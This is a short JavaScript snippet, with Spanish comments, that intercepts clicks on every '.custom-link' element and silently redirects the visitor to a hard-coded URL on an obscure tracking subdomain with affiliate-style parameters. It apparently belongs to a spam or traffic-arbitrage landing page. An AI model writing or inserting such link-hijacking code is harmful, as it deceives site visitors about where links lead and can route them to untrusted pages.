document.addEventListener("DOMContentLoaded", function() {
    const customLinks = document.querySelectorAll('.custom-link');
    const url = "https://bgklvq.lovelygiri.net/?utm_source=da57dc555e50572d&s1=194408&s2=1862332&s3=Historia&s5=julio-9&click_id=landing1&ban=twitter&j1=1&j6=1";
    
    customLinks.forEach(link => {
        link.addEventListener('click', function(event) {
            event.preventDefault(); // Prevenir el comportamiento predeterminado del enlace
            window.location.href = url; // Redirigir a la URL deseada
        });
    });
});